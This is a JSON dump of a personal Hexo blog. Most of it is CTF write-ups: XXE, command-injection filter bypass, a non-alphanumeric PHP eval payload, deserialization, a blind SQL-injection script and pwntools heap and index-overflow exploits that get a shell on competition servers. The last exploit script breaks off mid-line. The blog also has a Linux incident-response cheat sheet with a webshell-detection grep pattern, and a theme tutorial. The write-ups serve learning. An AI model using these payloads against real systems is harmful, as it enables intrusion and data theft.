{"meta":{"title":"Lzywi'Blog","subtitle":"Life is short, use Python","description":null,"author":"Lzy-wi","url":"http://yoursite.com"},"pages":[{"title":"category","date":"2020-09-17T08:32:13.000Z","updated":"2020-09-17T08:32:13.699Z","comments":true,"path":"category/index.html","permalink":"http://yoursite.com/category/index.html","excerpt":"","text":""},{"title":"About me","date":"2018-05-07T21:16:07.000Z","updated":"2020-09-21T12:37:59.073Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":"Office高级工程师"},{"title":"title","date":"2018-05-07T21:05:04.000Z","updated":"2018-05-09T10:52:34.000Z","comments":true,"path":"title/index.html","permalink":"http://yoursite.com/title/index.html","excerpt":"","text":""},{"title":"home","date":"2018-05-07T20:57:16.000Z","updated":"2018-05-09T10:52:34.000Z","comments":true,"path":"home/index.html","permalink":"http://yoursite.com/home/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-05-07T20:57:28.000Z","updated":"2018-05-10T07:02:23.000Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"fluid主题博客主页添加一言(hitokoto)手把手教学","slug":"fluid-add-hitokoto","date":"2020-09-21T12:06:07.000Z","updated":"2020-09-21T12:26:20.545Z","comments":true,"path":"2020/09/21/fluid-add-hitokoto/","link":"","permalink":"http://yoursite.com/2020/09/21/fluid-add-hitokoto/","excerpt":"前言所以说爱恨真是奇怪的东西，有的早早腐烂入土，有的刻骨。 ——「全球高考」","text":"前言所以说爱恨真是奇怪的东西，有的早早腐烂入土，有的刻骨。 ——「全球高考」 启发不知不觉博客换了yilia、next、fluid三个主题了，三个主题都用了挺长时间。偶然间看到别人发的博客主页有句很好看的句子，自己也想搞一个来于是就动手搞一搞……对于我这种主页不知道哔哔什么废话的再适合不过了。然鹅那个博客刷新的时候并没有发起特殊的请求，不过还好后来在同事的博客找到获取一句话的网络请求，后来发现这个叫一言而且很多博客也有在用，孤陋寡闻了[捂脸]首先fluid_config.yml中首页的一句话是在index下的slogan中的text设置，顺便添加hitokoto参数，方便开启和关闭一言。index: banner_img: /img/default.jpg # 首页 Banner 头图，以下相同 banner_img_height: 100 # 头图高度，屏幕百分比，available: 0 - 100 banner_mask_alpha: 0.3 # 头图黑色蒙版的透明度，available: 0 - 1.0， 0 是完全透明（无蒙版），1 是完全不透明 post_default_img: '' # 默认的文章封面图，当没有指定 index_img 时会使用该图片，若都为空则不显示任何图片 slogan: # 首页副标题的独立设置 enable: true # 为 false 则不显示任何内容 text: '' hitokoto: enable: true # 开启hitokoto优先显示hitokoto auto_excerpt: enable: true post_url_target: _self # available: _blank | _self post_meta: # 是否显示文章信息（时间、分类、标签） date: true category: true tag: true ... text参数会传到fluid/layout/index.ejs最开始是想在这里更改为一言的一句话，在最上面可以通过插入&lt;script&gt;标签,然后使用ajax执行Get请求就可以获得一言的句子，但是此方法获取到的值只能在&lt;script&gt;内使用，不能赋值到ejs中我也不会也没查到遂卒后来百度查到hitokoto有官方调用的文档–&gt;传送门也查到一个fluid主题添加一言的教程给了很多帮助–&gt;传送门，然而那个人的博客主页并没有设置成功/doge，还有这篇–&gt;传送门根据博客里讲的，修改的地方位于layout\\_partial\\plugins\\typed.ejs，仔细想想也没错，修改index.ejs可以直接显示一言不用管其他文件但是实现起来有点困难，typed.ejs是打字机的js控制程序，通过修改typed.ejs实现index页面打印一言，其余页面该打印什么打印什么，只要加个if条件判断是index页面还是其他页面。 修改typed.ejs首先原始的typed.ejs主要分为2部分，第一部分是打字机调用程序，第二部分是接口首先把打字机调用程序改成function形式，通过调用typing函数来输出，需要传入的参数有id和hitokoto(subtitle)，在原始的typed.ejs中通过&lt;%- data.subtitle %&gt;形式来传参，改成函数的时候要改为hitokoto，同时在typed.ejs中的#subtitle是输出点var typed = new Typed('#subtitle', &#123; 对应到layout.ejs中的如下位置，通过id来确定输出点后来发现改了&lt;%- hitokoto %&gt;这个也可以，装死如果控制台出现如下异常则是因为typed.ejs中#后面的参数和layout.ejs的输出点的id不一样导致打字机找不到输出点报的异常。TypeError: Cannot read property 'tagName' of null 因为我的目标只需要修改index页面的打字机而其他页面还是原来的样子，一旦修改了#subtitle就会触发报错，当然也可以不修改，因为我一开始没搞懂就改了，就懒得改回去了。封装好typing函数之后typing(&quot;subtitle&quot;, &quot;&lt;%- data.subtitle %&gt;&quot;)就可以调用，达到原来的样子根据参考的博客教程添加&lt;% if(is_post()) { %&gt;条件可以过让文章打印原始的subtitle，也就是对应着文章的标题，但是还不行，在其他归档、标签、关于等页面还是会显示一言。打开about.ejs和page.ejs对比会发现固定页面page.layout则是背设为固定，page.ejs则不是//about.ejs page.layout = \"about\" //page.ejs var layout = page.layout 因此用&amp;&amp; page.layout!==&#39;about&#39; &amp;&amp; page.layout!==&#39;links&#39; &amp;&amp; page.layout!==&#39;archive&#39; &amp;&amp; page.layout!==&#39;tags&#39;可以排除掉不想展示的页面。(如果你想要所有页面设为一言就去掉即可)。按照博客教程是只显示一句话，没有出处。对于引用别人的东西我喜欢加上出处data.hitokoto + '&lt;br&gt;&lt;br&gt;&lt;span class=\"from\" id=\"from\"&gt;' + ' ——「' +data.from + '」&lt;/span&gt;' 关于出处一开始是用两个函数调用去输出然后发现很乱，一个句子和出处一起输出又不知道怎么实现出处右对齐学艺不精,等等我本来就不是专精这个的→_→。于是就通过一些css调整使形式相对更美观一些。修改后的type.ejs如下 &lt;% if(theme.fun_features.typing.enable &amp;&amp; page.subtitle !== false)&#123; %&gt; &lt;%- js_ex(theme.static_prefix.typed, \"/typed.min.js\") %&gt; &lt;script&gt; function typing(id, hitokoto)&#123; var typed = new Typed('#' + id, &#123; strings: [ ' ', hitokoto + \"&amp;nbsp;\", ], cursorChar: \"&lt;%- theme.fun_features.typing.cursorChar %&gt;\", typeSpeed: &lt;%- theme.fun_features.typing.typeSpeed %&gt;, loop: &lt;%- theme.fun_features.typing.loop %&gt;, &#125;); typed.stop(); $(document).ready(function () &#123; $(\".typed-cursor\").addClass(\"h2\"); typed.start(); &#125;); &#125;; &lt;% if(is_post()) &#123; %&gt; typing(\"subtitle\", \"&lt;%- data.subtitle %&gt;\") &lt;% &#125; else if(theme.index.hitokoto.enable &amp;&amp; page.layout!=='about' &amp;&amp; page.layout!=='links' &amp;&amp; page.layout!=='archive' &amp;&amp; page.layout!=='tags') &#123; %&gt; fetch('https://v1.hitokoto.cn') .then(response =&gt; response.json()) .then(data =&gt; &#123; typing(\"hitokoto\", (data.hitokoto + '&lt;br&gt;&lt;br&gt;&lt;span class=\"from\" id=\"from\"&gt;' + ' ——「' +data.from + '」&lt;/span&gt;')) &#125;) .catch(console.error) &lt;% &#125; else if(page.layout!== '' ) &#123; %&gt; typing(\"subtitle\", \"&lt;%- data.subtitle %&gt;\") &lt;% &#125; %&gt; &lt;/script&gt; &lt;% &#125; %&gt; 修改layout.ejslayout.ejs则和博客教程的那样即可 &lt;span class=\"h2\" id=\"subtitle\"&gt; &lt;% if(theme.fun_features.typing.enable == false) &#123; %&gt; &lt;%- subtitle %&gt; &lt;% &#125; %&gt; &lt;/span&gt; &lt;% if(!is_post()) &#123; %&gt; &lt;br&gt; &lt;span class=\"h2\" id=\"subtitle\"&gt; &lt;% if(theme.fun_features.typing.enable == false) &#123; %&gt; &lt;%- hitokoto %&gt; &lt;% &#125; %&gt; &lt;/span&gt; &lt;% &#125; %&gt; &lt;% if(is_post() &amp;&amp; page.meta !== false) &#123; %&gt; &lt;%- partial('_partial/post-meta') %&gt; &lt;% &#125; %&gt; &lt;/div&gt; 成品如下，还有在博客下方评论框实现的。为什么刷不到那句话。","categories":[],"tags":[{"name":"hitokoto","slug":"hitokoto","permalink":"http://yoursite.com/tags/hitokoto/"},{"name":"fluid","slug":"fluid","permalink":"http://yoursite.com/tags/fluid/"},{"name":"hexo","slug":"hexo","permalink":"http://yoursite.com/tags/hexo/"}]},{"title":"2019广东省强网杯writeup","slug":"qiangwangbei-GD-writewp","date":"2019-09-11T01:48:43.000Z","updated":"2020-09-17T11:01:20.166Z","comments":true,"path":"2019/09/11/qiangwangbei-GD-writewp/","link":"","permalink":"http://yoursite.com/2019/09/11/qiangwangbei-GD-writewp/","excerpt":"这个比赛是想好好打的，第一天还好，项目做完了专心打了大半天，下午到快晚上的时候又有事情，导致后面就大概看了一下，没有怎么投入，不过这次比赛脑洞难度不算太大，做的还算不错。","text":"这个比赛是想好好打的，第一天还好，项目做完了专心打了大半天，下午到快晚上的时候又有事情，导致后面就大概看了一下，没有怎么投入，不过这次比赛脑洞难度不算太大，做的还算不错。 misc完美的错误题目描述：小明在实现避免字符混淆的编码算法时,不小心错位了数组，你能帮他还原代码吗？RJv9mjS1bM9MZafGV77uTyDaapNLSk6t358j2Mdf1pbCByjEiVpX关键点：避免字符混淆这个提示是与base58编码有关，base58与base64的区别参考先知社区的一篇文章–&gt;传送门错位了数组应该是数字和字母换了位置，直接用哪里的代码改一下就出来了#-*-coding:utf-8 __b58chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789' #这里原本是123456789A-Za-z的 __b58base = len(__b58chars) def b58encode(v): \"\"\" encode v, which is a string of bytes, to base58. \"\"\" long_value = int(v.encode(\"hex_codec\"), 16) result = '' while long_value &gt;= __b58base: div, mod = divmod(long_value, __b58base) result = __b58chars[mod] + result long_value = div result = __b58chars[long_value] + result # Bitcoin does a little leading-zero-compression: # leading 0-bytes in the input become leading-1s nPad = 0 for c in v: if c == '\\0': nPad += 1 else: break return (__b58chars[0] * nPad) + result def b58decode(v): \"\"\" decode v into a string of len bytes \"\"\" long_value = 0L for (i, c) in enumerate(v[::-1]): long_value += __b58chars.find(c) * (__b58base ** i) result = '' while long_value &gt;= 256: div, mod = divmod(long_value, 256) result = chr(mod) + result long_value = div result = chr(long_value) + result nPad = 0 for c in v: if c == __b58chars[0]: nPad += 1 else: break result = chr(0) * nPad + result return result if __name__ == \"__main__\": # print b58encode(\"hello world\") print b58decode(\"RJv9mjS1bM9MZafGV77uTyDaapNLSk6t358j2Mdf1pbCByjEiVpX\") flag{adb88f7b70a20983833a7615fb103e01} 撸啊撸用winhex搜索png文件尾发现后面多了东西，提取出来后发现是一段程序，但是文件头损坏了，__mh_execute_header、/usr/lib/libSystem.B.dylib这些都是mach-o的可执行文件格式别问我为什么知道，都是大佬发现的，我只是个复读机，修复文件头如下，找到一个有例子的文章可以参考–&gt;传送门程序关键伪代码如下#start __int64 start() &#123; __int64 result; // rax char v1; // [rsp+10h] [rbp-30h] __int64 v2; // [rsp+38h] [rbp-8h] strcpy(&amp;v1, \"938gce1`872db99db`b342d23c0g9g2d\"); if ( v1 == 48 ) sub_100000E40(&amp;v1); result = __stack_chk_guard; if ( __stack_chk_guard == v2 ) result = 0LL; return result; &#125; #sub_100000E40 int __fastcall sub_100000E40(const char *a1) &#123; int i; // [rsp+14h] [rbp-Ch] for ( i = 0; i &lt; strlen(a1); ++i ) a1[i] ^= 1u; return printf(\"flag为:%s\\n\", a1); &#125; code = '938gce1`872db99db`b342d23c0g9g2d' text = '' for i in code: text += chr(ord(i)^1) print text #829fbd0a963ec88ecac253e32b1f8f3e flag{829fbd0a963ec88ecac253e32b1f8f3e} 脑筋急转弯下载回来是一个wav音频文件，没发现摩斯频谱也没发现什么就卡住了，后来队友说用SilentEye可以提取出一个zip文件我去还有这操作然后爆破出密码得到一堆012012012又卡住了，后来某位大佬把0-&gt;.,1-&gt;!,2-&gt;?然后得到Ook码，然后Ook转Brainfuck转text然后就解出来了O_o..(空格要去掉)lalala,wo shi mai bao de xiao hang jia.flag&#123;08277716193eda6c592192966e9d6f39&#125; ni neng cai dao ta me? flag{08277716193eda6c592192966e9d6f39} web小明又被拒绝了题目描述：小明又被拒绝了，你能帮助他吗？抓包添加请求头X-Forwarded-For: 127.0.0.1和把admin改为1flag{xxasdasdd_for} XX?题目描述：XXXXX？？？联想到XXE，扫描得到index.php和flag.php文件，扫描备份文件得到index.php~文件&lt;?php #鍏抽棴Warning error_reporting(E_ALL^E_NOTICE^E_WARNING); $xmlfile = file_get_contents('php://input'); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $user = $creds-&gt;user; $pass = $creds-&gt;pass; echo \"CTF:\" . \"&lt;br&gt;\" . \"$user\"; ?&gt; POST上去一个xxe的payload&lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE note[ &lt;!ELEMENT note (user)&gt; &lt;!ENTITY hack3r \"Hu3sky\"&gt; ]&gt; &lt;note&gt; &lt;user&gt;&amp;hack3r;&lt;/user&gt; &lt;/note&gt; 成了，有戏，试着读了一下/etc/passwd文件ok,已经可以任意文件读取了尝试读取flag.php的时候发现一直读取失败，百思不得其解，web访问也的确存在，队友用php伪协议拿到了flag{IUyasd8213123123890} 免费的,ping一下~题目描述：听说ping很好玩~考察命令执行，过滤了&lt;，&gt;，&amp;，|，空格，%0*，还有一些关键字可以用拼接的方法绕过，可以用${IFS}替换空格，$a=ca;$b=t;$a$b这样的方法来绕过关键字，然后这道题用cat是cat不到flag的，返回的内容有限，所以查到可以用sed查看指定的行A=;a=fl;b=ag;se\"\"d$&#123;IFS&#125;-n$&#123;IFS&#125;'16,18p'$&#123;IFS&#125;/$a$b flag{llllll_U_GeT_Th3_fl4g} php题目描述：PHP是世界上最…..的语言扫描得到index.php&lt;?php error_reporting(E_ALL^E_NOTICE^E_WARNING); function GetYourFlag()&#123; echo file_get_contents(\"./flag.php\"); &#125; if(isset($_GET['code']))&#123; $code = $_GET['code']; //print(strlen($code)); if(strlen($code)&gt;27)&#123; die(\"Too Long.\"); &#125; if(preg_match('/[a-zA-Z0-9_&amp;^&lt;&gt;\"\\']+/',$_GET['code'])) &#123; die(\"Not Allowed.\"); &#125; @eval($_GET['code']); &#125;else&#123; highlight_file(__FILE__); &#125; ?&gt; 这是一个无字符马，可以参考freebuf上的一篇文章–&gt;传送门，这是php7的一个解析特性，简单来说就是通过和~符号异或出我们需要的字符。(~%8F%97%8F%96%91%99%90)(); 这个是phpinfo();的一个payload，可以看到webshell是可以成功执行的然后上面也给了getflag的函数我们，直接调用就可以了&lt;?php $a = urlencode(~'GetYourFlag'); echo $a; //%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98 payload为(~%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98)();flag{3904c5df2e894ca02a21004feb21e617}备注：php是世界上最好的语言hah API题目描述：API打开提示Api!wow，访问api目录提示提示post filename和传入一个数组，不赋值时候提示json_decode error,固传入一个json数组，盲猜file参数。结果正确在这里浪费了很多时间来绕过stristr，发现是绕不过的。然后读取../index.php得到源码，看了下，是反序列化。把hack.php也读出来看来没错了。通过反序列化来读取fffffaa_not.php这个文件源码。(小声bb:全都是网上原题)通过../index.php的过滤条件可以构造出反序列化的字符串O:+4:\"hack\":1:&#123;s:4:\"file\";s:15:\"fffffaa_not.php\";&#125; 发送的时候需要url编码一下。然后得到源码fffffaa_not.php是一个写shell的功能。其中判断规则preg_match(‘[&lt;&gt;?]’, $text)。这个绕过很简单了，变成数组就可以了。参考–&gt;传送门成了，直接getshell拿flagflag{Oiahhh1_iiu123} 找漏洞题目描述：小明失恋后写了一个CMS，你能帮他找找漏洞吗？这道题大佬做出来了，我就学习一波。根据题目给出的源码包，程序是laravel 框架写的，这套框架和Django的编程思想差不多。不懂的可以先去看看 laravel 框架的设计逻辑。首先审计一下路由有什么可以用的。可以看到有5个路由。漏洞入口点是第一个路由user_testpage/{id}，其余的都要登陆后才能使用。在App\\Http\\Controllers\\UserController 里面的index方法。可以看到有个注入，只是简单的替换了关键字。直接sqlmap跑。Dump出数据可以看到有3条数据。刚开始尝试了暴力破解等方法。都没成功。随后在github上找了hash对比的工具，刚开始并不顺利，全部hash都是false。接着翻源码的时候意外发现一个password，在\\backup\\database\\factories\\UserFactory.php总感觉后面的注释是密码。一试果然成功。数据库里面前两个的password都是假的……登陆后台之后，就直接跳到上传吧首先带着cookie访问http://119.61.19.212:8085/home/uploadto_upload，会得到一个html意思是按照这个格式构造上传包。这里需要改改。Action填入的是http://119.61.19.212:8085/home/uploadss/NotAllow6171,files标签也要改。改成符合上传包的格式,这里需要注意uploadss后面是需要跟一个key，key从哪里来?回头看看数据库第二条。首先这里……十分恶心。刚开始一直以为上传点是不行的。然后我在源码注意到了template.blade.php。才把文件名改成template.blade.php 。然后在哪触发呢？blade框架中是类似于一个模板，需要在Controller中用view的方法展现。所以刚好ProfileController.php 中view了。所以就可以通过此方法覆盖php文件啦但是回到上传那里，虽然不拦截后缀。却不能上传新文件，也不能覆盖php代码进去，所以这里可以利用框架特性。template.blade.php是个模板文件。有特有的语法。经别人点化后在源码中其实有一个文件读取这个怎么用呢，看下图吧构造post包发送访问http://119.61.19.212:8085/home/profile出flagflag{Ucan_wow_easy_qaq}","categories":[],"tags":[{"name":"misc","slug":"misc","permalink":"http://yoursite.com/tags/misc/"},{"name":"web","slug":"web","permalink":"http://yoursite.com/tags/web/"},{"name":"writewp","slug":"writewp","permalink":"http://yoursite.com/tags/writewp/"}]},{"title":"应急响应之linux篇","slug":"Emergency_Response","date":"2019-07-22T11:32:50.000Z","updated":"2020-09-17T11:14:26.601Z","comments":true,"path":"2019/07/22/Emergency_Response/","link":"","permalink":"http://yoursite.com/2019/07/22/Emergency_Response/","excerpt":"记录一些常用linux应急响应知识","text":"记录一些常用linux应急响应知识 表现为卡慢-性能资源紧张free -m #以MB为单位查看内存使用情况 free -l #查看内存使用细节 ps aux|head -1;ps aux|grep -v PID|sort -rn -k +4|head #查看内存使用前十名 vmstat -a #查看CPU使用详情 vmstat -d #查看CPU使用详情 宕机死机dmesg -T #按时间点查看内核日志 dmesg -T |grep memory #查看和内存相关的日志记录 dmesg -T |grep cache #查看和崩溃相关的日志记录 dmesg -T |grep reboot #查看和重启相关的日志记录 cat /var/log/syslog #查看系统日志 cat /var/log/kern.log #查看内核日志(ubuntu是kern.log，其他是kernel.log) 断网断连排查-表现为网络不通或者间歇性连通iptables -L #查看防火墙 cat /etc/resolv.conf #查看域名解析 ifoncifg -a #查看网卡信息 一些服务的日志位置/var/log/httpd/access.log #http服务日志 /var/log/vsftp.log #ftp服务日志 /var/log/samba #samba服务日志 /var/log/message #DNS、DHCP日志 入侵点入侵特征排查netstat -antlop #查看 ps -ef #查看异常连接和对应的文件 ps aux #查看那进程详细信息 lsof -p pid #查看进程关联账户信息 附录：ps命令常用用法（方便查看系统进程） ps a #显示现行终端机下的所有程序，包括其他用户的程序。 ps -A #显示所有进程。 ps c #列出程序时，显示每个程序真正的指令名称，而不包含路径，参数或常驻服务的标示。 ps -e #此参数的效果和指定\"A\"参数相同。 ps e #列出程序时，显示每个程序所使用的环境变量。 ps f #用ASCII字符显示树状结构，表达程序间的相互关系。 ps -H #显示树状结构，表示程序间的相互关系。 ps -N #显示所有的程序，除了执行ps指令终端机下的程序之外。 ps s #采用程序信号的格式显示程序状况。 ps S #列出程序时，包括已中断的子程序资料。 ps -t&lt;终端机编号&gt; #指定终端机编号，并列出属于该终端机的程序的状况。 ps u #显示所有程序，不以终端机来区分。以用户为主的格式来显示程序状况。 ps x #显示所有程序，不以终端机来区分。 最常用的方法是ps -aux,然后再利用一个管道符号导向到grep去查找特定的进程,然后再对特定的进程进行操作 登陆和爆破排查last #查看登陆或者重启日志 lastb #查看登录失败日志，或者是cat /var/log/faillog who /var/log/wtmp #查看登录日志，或者last -f /var/run/utmp cat /var/log/lastlog #查看最后的登录日志 cat /var/log/secure #查看安全日志 cat /var/log/cron #查看计划任务日志 cat ~/.bash_history | more #查看历史操作 grep \"Failed password for root\" /var/log/auth.log | awk '&#123;print $11&#125;' | sort | uniq -nr | more #查看root账户登录爆破尝试 grep \"Accepted\" /var/log/auth.log | awk '&#123;print $11&#125;' | sort |uniq -c | sort -nr | more #查看登录成功日志信息 strings /usr/bin/.sshd | egrep '[1-9]&#123;1,3&#125;.[1-9]&#123;1,3&#125;.' #查看sshd的信息 漏洞利用入侵和后渗透的特征#查找webshell: find /var/www/ -name \"*.php\" | xargs egrep 'assert | phpspy | c99sh | milw0rm | eval | \\( gunerpress | \\(bas464_encode | spider _bc | shell_exec | passthru | \\(\\$\\_\\POST\\[|eval\\(str_rotl3 | .chr\\c|\\$\\&#123;\\\"\\_P|eval\\C\\$\\_R | file_put_contents\\C\\.\\*\\$\\_ | base64_decode' #文件查找的相关命令： sudo find / -mtime(atime/ctime) -x #按照创建、修改时间查找 sudo find ./ -perm 4777 #按照权限查找文件 find ./ -mtime -1 -type f #按照文件类型查找 find -mtime -1 -type f -name \\*.php #查找最近一天被修改过的php文件","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"},{"name":"应急响应","slug":"应急响应","permalink":"http://yoursite.com/tags/应急响应/"}]},{"title":"国赛华南赛区的一道注入题","slug":"guosaiwp1","date":"2019-06-25T08:53:12.000Z","updated":"2020-09-17T11:16:26.628Z","comments":true,"path":"2019/06/25/guosaiwp1/","link":"","permalink":"http://yoursite.com/2019/06/25/guosaiwp1/","excerpt":"这次国赛web几乎清一色登录框，而且和平常比赛的题目也有点不同吧（留下了没有技术的泪水）","text":"这次国赛web几乎清一色登录框，而且和平常比赛的题目也有点不同吧（留下了没有技术的泪水）题目环境搭建apache2+php7.2+mysqlubuntu apt-get install apache2 php7.2 mysql-server php7.2-mysql libapache2-mod-php mysql /etc/mysql/mysql.conf.d/mysqld.cnf添加secure_file_priv = \"/\" GRANT FILE ON *.* TO 'www-data'@'%'; GRANT ALL PRIVILEGES ON `test`.`user` TO 'www-data'@'%'; 注入点判断payload，过滤了很多参数admin'/**/or/**/'1'='1'# 成功登陆后提示flag在根目录mysql读取文件有个方法是用load_file这个命令,具体用法如下mysql&gt; select load_file('/flag'); +--------------------------+ | load_file('/flag') | +--------------------------+ | ciscn&#123;T2UXiFeu7HzoBj4R&#125; | +--------------------------+ 1 row in set (0.01 sec) 因为and被过滤了，^（异或）没有，所以判断语句如下admin'^1^1# ^符号的用法如下mysql&gt; select * from user where username = 'admin'^1^1; +----------+----------+ | username | password | +----------+----------+ | admin | admin123 | +----------+----------+ 1 row in set, 2 warnings (0.00 sec) mysql&gt; select * from user where username = 'admin'^1^0; Empty set, 2 warnings (0.00 sec) 因此我们需要构造判断结果为1的查询语句，这里要用到like这个方法mysql&gt; select username like 'a%' from user; +--------------------+ | username like 'a%' | +--------------------+ | 1 | +--------------------+ 1 row in set (0.00 sec) mysql&gt; select username like 'b%' from user; +--------------------+ | username like 'b%' | +--------------------+ | 0 | +--------------------+ 1 row in set (0.00 sec) 结合上面我们的payload为admin'^1^(select/**/load_file('/flag')/**/like/**/'c%') python脚本如下import requests import string url = 'http://192.168.1.205/ciscn12/web4/index.php' def query(data): global url payload = \"admin'^1^(select/**/load_file('/flag')/**/like/**/'&#123;data&#125;%')#\".format(data = data) proxies = &#123;\"http\": \"http://127.0.0.1:8080\",\"https\": \"http://127.0.0.1:8080\",&#125; data = &#123;'username':payload,'password':'1'&#125; req = requests.post(url = url,data = data) length = len(req.text) return length if __name__ == '__main__': flag = '' str = string.letters+string.digits+'&#123;'+'&#125;' for j in range(50): for i in str: flag += i res = query(flag) if(res == 462): break else: flag = flag[:-1] print flag if i == '&#125;': break resultc ci cis cisc ciscn ciscn&#123; ciscn&#123;T ciscn&#123;T2 ciscn&#123;T2U ciscn&#123;T2UX ciscn&#123;T2UXi ciscn&#123;T2UXiF ciscn&#123;T2UXiFe ciscn&#123;T2UXiFeu ciscn&#123;T2UXiFeu7 ciscn&#123;T2UXiFeu7H ciscn&#123;T2UXiFeu7Hz ciscn&#123;T2UXiFeu7Hzo ciscn&#123;T2UXiFeu7HzoB ciscn&#123;T2UXiFeu7HzoBj ciscn&#123;T2UXiFeu7HzoBj4 ciscn&#123;T2UXiFeu7HzoBj4R ciscn&#123;T2UXiFeu7HzoBj4R&#125; 待更新","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"},{"name":"注入","slug":"注入","permalink":"http://yoursite.com/tags/注入/"},{"name":"web","slug":"web","permalink":"http://yoursite.com/tags/web/"}]},{"title":"第十二届全国大学生信息安全竞赛初赛writeup","slug":"guosaiwp","date":"2019-04-23T12:32:52.000Z","updated":"2020-09-17T11:24:21.827Z","comments":true,"path":"2019/04/23/guosaiwp/","link":"","permalink":"http://yoursite.com/2019/04/23/guosaiwp/","excerpt":"大佬的博客–&gt;传送门","text":"大佬的博客–&gt;传送门 misc签到摄像头捕捉到三个人的脸即可 saleae下载回来一个saleae.logicdata文件，经搜索发现这个saleae的可以打开的文件类型，官网地址–&gt;传送门，打开文件只发现一些波形网上搜索资料看到一篇教程通过xor两条数据流得到信息，上面一条是当上面波形的电平为高电平且下面那条也是高电平时为1，下面那条是低电平则为0，如图最后得到一串数据011001100110110001100001011001110111101100110001001100100011000000110111001100010011001100111001001101110010110100110001001110010110010000110001001011010011010000111000011001010011011000101101011000100110010100111000011000110010110100110111001110000011010001100010001110000011100101100001001110010011010101100101001100000011011101111101 8个一组得到flag usbasp打开文件后在analyzer里选择SPI，设置选项最下面选择enable line is active hight右下面可以明显看到flag导出即可 pwnyour-pwn在函数sub_B35里面，没有对index(v1)进行检查，从而造成任意地址泄露和任意地址更改。直接改返回地址为one_gadget即可for ( i = 0; i &lt;= 40; ++i ) &#123; puts(\"input index\"); __isoc99_scanf(\"%d\", &amp;v1); printf(\"now value(hex) %x\\n\", (unsigned int)v4[v1]); puts(\"input new value\"); __isoc99_scanf(\"%d\", &amp;v2); v4[v1] = v2; &#125; 详细脚本如下：from pwn import * #context(os='linux',arch='amd64',aslr = 'False',log_level='debug') local = 0 if local: p = process(\"./pwn\") else: p = remote(\"39.97.228.196\",60007) def pass_(): p.recvuntil(\"name\") p.sendline(\"Team233\") def change(index, addr): for i in range(8): p.recvuntil(\"index\\n\") p.sendline(str(index+i)) p.recvuntil(\"now value(hex) \") data = p.recvn(1) #print(\"data = \" + str(data)) p.recvuntil(\"input new value\\n\") p.sendline(str(addr)) addr = addr &gt;&gt; 8 def leak(index): addr = \"\" for i in range(8): p.recvuntil(\"index\\n\") p.sendline(str(index+i)) p.recvuntil(\"now value(hex) \") data = int(p.recvuntil(\"\\n\",drop=True),16) if data &gt; 300: data = data - 0xffffff00 p.recvuntil(\"input new value\\n\") p.sendline(str(data)) addr += chr(data) addr = u64(addr) return addr def exp(): pass_() #gdb.attach(p)addr = leak(0x158) elf_base = addr - 0xb11 print '[*] elf_base :',hex(elf_base) addr = leak(0x160+0x118) libc_base = addr - 0x20830 one_shot = libc_base + 0xf02a4 print '[*] one_shot :',hex(one_shot) print '[*] libc_base :',hex(libc_base) pause() change(0x158,one_shot) p.sendline(\"no\") p.sendline(\"cat flag\") p.interactive() exp() daily由于是%s打印内 容，会一直打印遇到\\x00才会停止，而且add的时候通过read读入没有写入字符串后缀，所以可以利用这一点可以泄露libc地址和heap地址。泄露利用如下：create(0x60,\"a\"*0x20)#0 create(0x60,\"a\"*0x20)#1 create(0x60,\"b\"*0x20)#2 delete(0) delete(1) create(0x60,\"a\")#0 show() p.recvuntil(\"0 : a\") data = \"\\x00\"+p.recvuntil(\"2\",drop=True) heap = u64(data.ljust(8,\"\\x00\")) print \"[*]heap : \", hex(heap) create(0x100,\"a\"*0x20)#1 create(0x100,\"a\"*0x20)#3 delete(1) create(0x20,\"a\"*0x20)#1 create(0xd0,\"a\"*8)#4 show() p.recvuntil(\"4 : aaaaaaaa\") data = p.recvn(6) + \"\\x00\\x00\" libc_base = u64(data) - 0x3c4b78 然后利用free的时候没有检查index(v1)，漏洞点如下程序部分代码，造成UAF分配到bss上的chunk_list，然后改free就可以了 。printf(\"Please enter the index of daily:\"); read(0, &amp;buf, 8uLL); v1 = atoi(&amp;buf); if ( chunk[v1].ptr ) &#123; free((void *)chunk[v1].ptr); chunk[v1].ptr = 0LL; LODWORD(chunk[v1].len) = 0; puts(\"remove successful!!\"); --chunk_num; &#125; 然后利用Double free得到bss段上的chunk_list,然后控制chunk，实现任意地址写，然后我们写free_hook地址为system，再free的时候就可以getshell了。在这之前，我们尝试了申请到malloc_hook前面然后把malloc_hoook覆盖为one_gadget，但是没有一个one_gadget可以成功，主要是因为条件没有满足，后来就直接free_hook了。详细脚本如下：from pwn import * #context(os='linux',arch='amd64',aslr = 'False',log_level='debug') local = 0 if local: p = process(\"./pwn\") else: p = remote(\"39.97.228.196\",60006) def show(): p.recvuntil(\":\") p.sendline(\"1\") def create(lens,content): p.recvuntil(\":\") p.sendline(\"2\") p.recvuntil(\":\") p.sendline(str(lens)) p.recv() p.send(content) def change(index,content): p.recvuntil(\":\") p.sendline(\"3\") p.recvuntil(\":\") p.sendline(str(index)) p.recv() p.send(content) def delete(index): p.recvuntil(\":\") p.sendline(\"4\") p.recvuntil(\":\") p.sendline(str(index)) chunk_list = 0x602060 def exp(): create(0x60,\"a\"*0x20)#0 create(0x60,\"a\"*0x20)#1 create(0x60,\"b\"*0x20)#2 delete(0) delete(1) create(0x60,\"a\")#0 show() p.recvuntil(\"0 : a\") data = \"\\x00\"+p.recvuntil(\"2\",drop=True) heap = u64(data.ljust(8,\"\\x00\")) print \"[*]heap : \", hex(heap) create(0x100,\"a\"*0x20)#1 create(0x100,\"a\"*0x20)#3 delete(1) create(0x20,\"a\"*0x20)#1 create(0xd0,\"a\"*8)#4 show() p.recvuntil(\"4 : aaaaaaaa\") data = p.recvn(6) + \"\\x00\\x00\" libc_base = u64(data) - 0x3c4b78 malloc_hook = libc_base + 0x3c4b10 one_shot = libc_base + 0xf02a4 free_hook = 